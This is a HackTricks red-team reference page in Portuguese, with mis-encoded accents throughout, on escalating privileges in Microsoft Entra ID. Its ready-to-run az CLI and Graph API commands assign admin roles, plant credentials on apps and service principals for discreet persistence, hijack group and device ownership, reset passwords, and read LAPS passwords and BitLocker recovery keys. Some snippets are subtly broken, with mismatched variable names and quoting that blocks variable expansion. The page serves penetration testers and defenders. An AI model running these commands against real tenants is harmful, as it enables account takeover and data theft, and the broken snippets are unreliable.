# Az - EntraID Privesc

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

{% hint style="info" %}
Note que **nem todas as permiss√µes granulares** dos pap√©is integrados no Entra ID **s√£o eleg√≠veis para serem usadas em pap√©is personalizados.**
{% endhint %}

## Roles

### Role: Privileged Role Administrator <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

Este papel cont√©m as permiss√µes granulares necess√°rias para poder atribuir pap√©is a principais e para dar mais permiss√µes a pap√©is. Ambas as a√ß√µes podem ser abusadas para escalar privil√©gios.

* Atribuir papel a um usu√°rio:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* Adicionar mais permiss√µes a um papel:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Aplica√ß√µes

### `microsoft.directory/applications/credentials/update`

Isso permite que um atacante **adicione credenciais** (senhas ou certificados) a aplicativos existentes. Se o aplicativo tiver permiss√µes privilegiadas, o atacante pode se autenticar como esse aplicativo e obter essas permiss√µes.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

Isso permite as mesmas a√ß√µes que `applications/credentials/update`, mas restrito a aplicativos de diret√≥rio √∫nico.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**Descri√ß√£o**: Atualizar propriet√°rios de aplica√ß√µes\
**Potencial de Abuso**: Ao se adicionar como propriet√°rio, um atacante pode manipular a aplica√ß√£o, incluindo credenciais e permiss√µes.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

Isso permite que um atacante adicione credenciais a principais de servi√ßo existentes. Se o principal de servi√ßo tiver privil√©gios elevados, o atacante pode assumir esses privil√©gios.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
A nova senha gerada n√£o aparecer√° no console da web, ent√£o isso pode ser uma maneira discreta de manter a persist√™ncia sobre um principal de servi√ßo.\
A partir da API, elas podem ser encontradas com: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

Se voc√™ receber o erro `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."` √© porque **n√£o √© poss√≠vel modificar a propriedade passwordCredentials** do SP e primeiro voc√™ precisa desbloque√°-la. Para isso, voc√™ precisa de uma permiss√£o (`microsoft.directory/applications/allProperties/update`) que permite que voc√™ execute:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

Isso permite que um atacante adicione credenciais a principais de servi√ßo existentes. Se o principal de servi√ßo tiver privil√©gios elevados, o atacante pode assumir esses privil√©gios.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

Semelhante a aplicativos, esta permiss√£o permite adicionar mais propriet√°rios a um principal de servi√ßo. Possuir um principal de servi√ßo permite controle sobre suas credenciais e permiss√µes.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
Depois de adicionar um novo propriet√°rio, tentei remov√™-lo, mas a API respondeu que o m√©todo DELETE n√£o era suportado, mesmo sendo o m√©todo que voc√™ precisa usar para excluir o propriet√°rio. Portanto, **n√£o √© poss√≠vel remover propriet√°rios atualmente**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` e `enable`

Essas permiss√µes permitem desabilitar e habilitar principais de servi√ßo. Um atacante poderia usar essa permiss√£o para habilitar um principal de servi√ßo ao qual ele poderia obter acesso de alguma forma para escalar privil√©gios.

Observe que, para essa t√©cnica, o atacante precisar√° de mais permiss√µes para assumir o controle do principal de servi√ßo habilitado.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

Essas permiss√µes permitem criar e obter credenciais para single sign-on, o que pode permitir o acesso a aplicativos de terceiros.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## Grupos

### `microsoft.directory/groups/allProperties/update`

Esta permiss√£o permite adicionar usu√°rios a grupos privilegiados, levando √† escalada de privil√©gios.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**Nota**: Esta permiss√£o exclui grupos atribu√≠veis a fun√ß√µes do Entra ID.

### `microsoft.directory/groups/owners/update`

Esta permiss√£o permite se tornar um propriet√°rio de grupos. Um propriet√°rio de um grupo pode controlar a associa√ß√£o e as configura√ß√µes do grupo, potencialmente escalando privil√©gios para o grupo.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**Nota**: Esta permiss√£o exclui grupos atribu√≠veis a fun√ß√µes do Entra ID.

### `microsoft.directory/groups/members/update`

Esta permiss√£o permite adicionar membros a um grupo. Um atacante poderia adicionar a si mesmo ou contas maliciosas a grupos privilegiados, o que pode conceder acesso elevado.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

Esta permiss√£o permite atualizar a regra de associa√ß√£o em um grupo din√¢mico. Um atacante poderia modificar as regras din√¢micas para incluir a si mesmo em grupos privilegiados sem adi√ß√£o expl√≠cita.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**Nota**: Esta permiss√£o exclui grupos atribu√≠veis a fun√ß√µes do Entra ID.

### Privesc de Grupos Din√¢micos

Pode ser poss√≠vel para os usu√°rios escalarem privil√©gios modificando suas pr√≥prias propriedades para serem adicionados como membros de grupos din√¢micos. Para mais informa√ß√µes, consulte:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## Usu√°rios

### `microsoft.directory/users/password/update`

Esta permiss√£o permite redefinir a senha de usu√°rios n√£o administradores, permitindo que um potencial atacante escale privil√©gios para outros usu√°rios. Esta permiss√£o n√£o pode ser atribu√≠da a fun√ß√µes personalizadas.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

Essa permiss√£o permite modificar as propriedades do usu√°rio. √â comum encontrar grupos din√¢micos que adicionam usu√°rios com base nos valores das propriedades; portanto, essa permiss√£o pode permitir que um usu√°rio defina o valor da propriedade necess√°rio para ser membro de um grupo din√¢mico espec√≠fico e escale privil√©gios.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## Pol√≠ticas de Acesso Condicional e Bypass de MFA

Pol√≠ticas de acesso condicional mal configuradas que exigem MFA podem ser contornadas, verifique:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## Dispositivos

### `microsoft.directory/devices/registeredOwners/update`

Esta permiss√£o permite que atacantes se atribuam como propriet√°rios de dispositivos para ganhar controle ou acesso a configura√ß√µes e dados espec√≠ficos do dispositivo.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

Esta permiss√£o permite que atacantes associem sua conta a dispositivos para obter acesso ou contornar pol√≠ticas de seguran√ßa.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

Esta permiss√£o permite que atacantes leiam as propriedades das credenciais da conta de administrador local de backup para dispositivos associados ao Microsoft Entra, incluindo a senha

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

Esta permiss√£o permite acessar as chaves do BitLocker, o que pode permitir que um atacante decifre unidades, comprometendo a confidencialidade dos dados.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## Outras permiss√µes interessantes (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
